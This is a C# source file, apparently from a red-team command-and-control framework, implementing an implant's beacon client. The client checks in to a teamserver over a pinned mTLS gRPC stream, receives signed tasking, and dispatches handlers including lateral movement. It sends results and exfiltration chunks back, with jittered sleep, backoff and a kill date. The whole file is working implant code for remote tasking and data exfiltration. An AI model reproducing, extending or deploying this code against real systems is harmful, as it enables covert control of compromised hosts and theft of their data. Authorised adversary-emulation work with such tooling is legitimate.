using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;
// The generated gRPC client lives in Rod.V1.Beacon (a static client factory
// class with the nested BeaconClient). This class is also named Beacon, so alias
// the generated one to avoid the name clash.
using WireBeacon = Rod.V1.Beacon;

namespace Rod.Implant.Internal;

// The reference implant's mTLS check-in client: it opens the long-lived reverse
// Beacon.CheckIn stream, completes the handshake, and then loops reading
// downstream tasking and writing upstream results (architecture.md Sec 5/8,
// Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
// handshake/task/result messages. Mirrors the Go implant's beacon package.

/// <summary>
/// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
/// endpoint, complete the handshake, then loop dispatching downstream tasks and
/// reporting upstream results. Blocks until the cancellation token fires or the
/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
/// profile.
/// </summary>
internal sealed class Beacon
{
    private readonly string _beaconUrl;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly RSA _privateKey;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    /// <summary>
    /// Builds a Beacon whose handler registry carries no enroll bundle, so the
    /// lateral.move handler reports derivation as unavailable.
    /// </summary>
    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        IReadOnlyList<string> classVerbs, TextWriter log)
        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
    {
    }

    /// <summary>
    /// Builds a Beacon whose lateral.move handler can derive a child using
    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
    /// derivation disabled. <paramref name="classVerbs"/> is the baked class
    /// verb set; the advertised capability set derives from it (Sec 5.3).
    /// </summary>
    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
    {
        _beaconUrl = beaconUrl;
        _implantId = implantId;
        _leaf = leaf;
        _privateKey = privateKey;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll);
        _classVerbs = classVerbs;
        _log = log;
    }

    /// <summary>
    /// Blocks until cancellation or the kill date passing. Reconnects after a
    /// jittered sleep when the stream drops (implants are connection initiators;
    /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
    /// backing off exponentially over consecutive failures so a down teamserver
    /// is not hammered at beacon rate. The kill date is checked at the top of
    /// each cycle so a long-running implant self-terminates once it passes, not
    /// only on the next restart (architecture.md Sec 7).
    /// </summary>
    public async Task RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return;
            }
            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (RpcException ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
            }

            // A handshake refusal is permanent for this artifact (retired, kill
            // date expired, unknown implant -- none of them change on a retry),
            // so the loop ends there instead of reconnecting forever.
            if (cycle == BeaconCycleResult.Terminal)
                return;

            consecutiveFailures = cycle == BeaconCycleResult.Handshaken ? 0 : consecutiveFailures + 1;
            try
            {
                await SleepWithJitterAsync(consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
        }
    }

    // What one connect-handshake-task cycle produced, driving the reconnect
    // policy in RunAsync.
    private enum BeaconCycleResult
    {
        // The cycle never reached a handshake (a transport drop); retry.
        Dropped,

        // The handshake succeeded and the stream ran; reset the failure counter.
        Handshaken,

        // The server refused the handshake permanently; the caller terminates.
        Terminal,
    }

    // One connect-handshake-task cycle. Returns how the cycle ended so the
    // caller can distinguish a transport drop (retry) from a handshake refusal
    // (permanent). Throws on transport errors, which the caller logs and
    // retries.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        var pinned = new X509Certificate2Collection();
        foreach (var ca in _cas)
            pinned.Add(ca);
        handler.SslOptions = new SslClientAuthenticationOptions
        {
            ClientCertificates = new X509Certificate2Collection(_leaf),
            RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
                C2.PinServerChain(cert as X509Certificate2, chain, pinned),
        };

        // grpc-dotnet takes the channel address; HTTPS transport security comes
        // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
        // as "host:port" (no scheme); prepend https:// so the channel builder
        // accepts it.
        var address = GrpcAddress(_beaconUrl);
        using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
        {
            HttpHandler = handler,
        });

        var client = new WireBeacon.BeaconClient(channel);
        using var call = client.CheckIn(cancellationToken: cancellationToken);

        // The implant speaks first: handshake with its protocol version and identity.
        // The advertised capability set is the baked class verbs intersected with
        // the compiled handlers (architecture.md Sec 5.3), so the teamserver only
        // ever dispatches verbs this binary can run -- never an advertised verb
        // with no handler behind it.
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
        var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (hs.Status != HandshakeStatus.Ok)
        {
            // Every non-OK handshake status (unknown implant, kill date expired,
            // retired, identity/version mismatch) is permanent for this artifact:
            // retrying would not change the answer, so terminate instead of
            // reconnecting forever.
            _log.WriteLine($"handshake refused: {hs.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");

        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
        while (await call.ResponseStream.MoveNext(cancellationToken))
        {
            var frame = call.ResponseStream.Current;
            var task = TaskRequest.Parser.ParseFrom(frame.Payload);

            // Command signing (architecture.md Sec 9): verify the teamserver's
            // signature before any handler runs. A task that fails verification
            // is reported Failed with the cause -- the operator sees the
            // rejection on the task itself -- and nothing executes.
            TaskOutcome outcome;
            string output;
            IReadOnlyList<ExfilChunk> chunks;
            if (!TaskingVerifier.Verify(_implantId, task, _cas))
            {
                _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
                outcome = TaskOutcome.Failed;
                output = "task rejected: signature verification failed; not executed";
                chunks = Array.Empty<ExfilChunk>();
            }
            else
            {
                (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
            }
            var result = new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            };
            await call.RequestStream.WriteAsync(new Frame
            {
                Payload = ByteString.CopyFrom(result.ToByteArray()),
                Kind = FrameKind.TaskResult,
            });

            // Out-of-band exfil chunks follow the TaskResult on the same stream.
            // Each carries the task id so the server reassembles and routes them
            // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
            foreach (var chunk in chunks)
            {
                chunk.TaskId = task.TaskId;
                await call.RequestStream.WriteAsync(new Frame
                {
                    Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                    Kind = FrameKind.ExfilChunk,
                });
            }
        }

        return BeaconCycleResult.Handshaken;
    }

    // The failure counter's doubling cap: the reconnect delay grows as
    // base * 2^failures up to 16x, keeping a down teamserver from being polled
    // at beacon rate forever.
    private const int MaxBackoffExponent = 4;

    // Sleeps for the base interval (doubled per consecutive failure, capped)
    // +/- jitter/2, honoring cancellation.
    private async Task SleepWithJitterAsync(int consecutiveFailures, CancellationToken cancellationToken)
    {
        var d = _sleep;
        for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
            d += d;
        if (_jitter > TimeSpan.Zero)
        {
            var deltaTicks = (long)(Random.Shared.NextDouble() * _jitter.Ticks) - _jitter.Ticks / 2;
            d = d + TimeSpan.FromTicks(deltaTicks);
        }
        if (d < TimeSpan.Zero)
            d = TimeSpan.Zero;
        await Task.Delay(d, cancellationToken);
    }

    // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
    // scheme is required, so "host:port" becomes "https://host:port" and an
    // explicit http:// is upgraded to https:// (the beacon channel is always
    // mTLS; a plaintext URL is a mistake, not a downgrade). Any trailing path is
    // dropped -- gRPC uses the :authority, not a path.
    private static string GrpcAddress(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        if (u.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            u = u["https://".Length..];
        else if (u.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            u = u["http://".Length..];
        var slash = u.IndexOf('/');
        if (slash >= 0)
            u = u[..slash];
        return $"https://{u}";
    }
}
